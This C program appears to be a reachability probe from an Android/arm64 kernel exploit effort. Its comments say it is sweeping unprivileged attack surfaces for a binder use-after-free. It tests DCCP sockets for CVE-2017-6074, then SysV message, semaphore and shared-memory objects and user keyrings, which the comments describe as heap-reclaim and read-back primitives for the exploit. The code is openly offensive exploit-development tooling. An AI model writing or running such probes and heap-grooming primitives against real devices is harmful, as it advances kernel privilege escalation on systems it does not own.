#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/msg.h>
#include <sys/sem.h>
#include <sys/shm.h>

#define MY_SYS_msgget 186
#define MY_SYS_semget 190
#define MY_SYS_shmget 194
#define MY_SYS_add_key 217
#define MY_SYS_request_key 218
#define MY_SYS_keyctl 219
static int s_msgget(int k,int f){return (int)syscall(MY_SYS_msgget,k,f);}
static int s_semget(int k,int n,int f){return (int)syscall(MY_SYS_semget,k,n,f);}
static int s_shmget(int k,size_t sz,int f){return (int)syscall(MY_SYS_shmget,k,sz,f);}
#include <sys/syscall.h>
#include <linux/keyctl.h>

/* arm64 (asm-generic) numbers for THIS tree: include/uapi/asm-generic/unistd.h
 *   msgget 186 msgctl 187 msgrcv 188 msgsnd 189 semget 190 shmget 194
 *   add_key 217 request_key 218 keyctl 219
 * (303/304/248/250 are the x86 numbers -- they gave me a false ENOSYS/EACCES.) */


/* One-shot reachability sweep for the two surfaces the patch audit left unmeasured,
 * plus the reclaim objects I need for the binder UAF.  Every test runs in a child
 * behind alarm(2): a kernel-side hang must not eat the probe (af_netlink/af_alg taught
 * me that the hard way).
 *
 * Why each one matters:
 *  SOCK_DCCP    -> CVE-2017-6074 double free -> the only "free class" row still alive
 *  msgget       -> msg_msg = kmalloc-512 with attacker-controlled lifetime
 *  add_key      -> key payload = kmalloc(plen) with NO header, and keyctl(READ) is a
 *                  clean read-back of the whole reclaimed slot
 *  semget/shmget-> other IPC objects reachable without capabilities
 */

#ifndef IPPROTO_DCCP
#define IPPROTO_DCCP 33
#endif
#ifndef SOCK_DCCP
#define SOCK_DCCP 6
#endif
#ifndef IPC_PRIVATE
#define IPC_PRIVATE 0
#define IPC_CREAT 0600
#define IPC_RMID 0
#endif
#ifndef KEYCTL_READ
#define KEYCTL_READ 11
#define KEYCTL_INVALIDATE 21
#endif
#ifndef KEY_SPEC_SESSION_KEYRING
#define KEY_SPEC_SESSION_KEYRING -3
#endif

static long kadd(const char *type, const char *desc, const void *p, size_t len, int kring)
{
    return (long)syscall(MY_SYS_add_key, type, desc, p, len, kring);
}

static void t(const char *name, int (*fn)(void))
{
    pid_t kid;
    int st;

    kid = fork();
    if (kid == -1) { printf("%-22s fork fail\n", name); return; }
    if (kid == 0) {
        int rc;
        alarm(2);
        rc = fn();
        printf("%-22s -> %d (errno=%d %s)\n", name, rc, errno, strerror(errno));
        _exit(0);
    }
    if (waitpid(kid, &st, 0) < 0) { printf("%-22s waitpid fail\n", name); return; }
    if (WIFSIGNALED(st))
        printf("%-22s -> KILLED by sig %d (hang or crash: not usable)\n", name, WTERMSIG(st));
}

static int f_dccp(void)      { return socket(AF_INET, SOCK_DCCP, IPPROTO_DCCP); }
static int f_dccp_raw(void)  { return socket(AF_INET, SOCK_RAW, IPPROTO_DCCP); }
static int f_msgget(void)    { return s_msgget(IPC_PRIVATE, IPC_CREAT | 0666); }
static int f_semget(void)    { return s_semget(IPC_PRIVATE, 1, IPC_CREAT | 0666); }
static int f_shmget(void)    { return s_shmget(IPC_PRIVATE, 4096, IPC_CREAT | 0666); }
static int f_add_key(void)
{
    char pl[64];
    long k;
    memset(pl, 0x41, sizeof pl);
    k = kadd("user", "xplay6probe", pl, sizeof pl, KEY_SPEC_SESSION_KEYRING);
    return (int)k;
}
static int f_add_key_reqk(void)
{
    return (int)syscall(MY_SYS_request_key, "user", "xplay6probe", "", KEY_SPEC_SESSION_KEYRING);
}
static int f_key_read(void)
{
    char pl[64], out[256];
    long k;
    memset(pl, 0x41, sizeof pl);
    k = kadd("user", "xplay6probe2", pl, sizeof pl, KEY_SPEC_SESSION_KEYRING);
    if (k < 0) return -1;
    errno = 0;
    if (syscall(MY_SYS_keyctl, KEYCTL_READ, k, out, sizeof out) < 0) return -2;
    return memcmp(out, pl, sizeof pl) ? -3 : (int)k;
}
static int f_key_inval(void)
{
    char pl[64];
    long k;
    memset(pl, 0x42, sizeof pl);
    k = kadd("user", "xplay6probe3", pl, sizeof pl, KEY_SPEC_SESSION_KEYRING);
    if (k < 0) return -1;
    errno = 0;
    return (int)syscall(MY_SYS_keyctl, KEYCTL_INVALIDATE, k);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("id: "); fflush(stdout);
    system("id 2>&1 | head -1");
    t("socket DCCP", f_dccp);
    t("socket RAW/DCCP", f_dccp_raw);
    t("msgget", f_msgget);
    t("semget", f_semget);
    t("shmget", f_shmget);
    t("add_key(user)", f_add_key);
    t("request_key", f_add_key_reqk);
    t("add_key+KEYCTL_READ", f_key_read);
    t("keyctl INVALIDATE", f_key_inval);
    return 0;
}
